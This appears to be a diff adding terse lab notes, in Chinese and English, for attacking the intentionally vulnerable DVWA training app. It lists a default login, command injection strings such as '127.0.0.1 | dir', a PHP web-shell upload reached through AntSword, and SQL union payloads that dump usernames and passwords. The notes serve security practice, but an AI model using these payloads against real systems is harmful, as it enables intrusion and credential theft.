@@ -1,0 +1,38 @@
+Brute Force
+low/medium/high/impossible
+admin/password
+
+....
+
+Command Injection
+Windows
+
+low/medium
+Windows
+127.0.0.1 | dir
+
+high
+127.0.0.1 || dir
+
+File Upload
+low
+直接上传a.php
+蚁剑路径 http://127.0.0.1/DVWA-master/hackable/uploads/a.php
+
+medium
+
+SQL注入
+low
+1' and 1=1#    与     1' and 1=2#   判断注入点
+1' order by 2#       通过order by判断返回值只有两个
+1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#
+1' union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'#
+1' union select 1,group_concat(password,user) from users#
+
+
+
+
+
+
+
+
